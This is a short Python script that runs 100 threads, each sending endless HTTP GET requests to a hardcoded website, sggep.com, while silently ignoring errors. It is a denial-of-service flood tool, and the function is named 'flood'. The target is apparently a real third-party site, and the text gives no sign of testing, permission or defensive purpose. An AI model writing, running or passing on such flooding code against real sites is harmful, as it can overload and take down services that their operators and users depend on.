import requests

import threading

def flood():
	while True:
		try:
			url='https://sggep.com/'
			x = requests.get(url)
			print(x.status_code)
		except:
			pass

threads=[]
for i in range(100):
	t=threading.Thread(target=flood)
	t.daemon=True
	threads.append(t)
	print(1)

for i in threads:
	i.start()
	print(2)
for i in threads:
	i.join()
	print(3)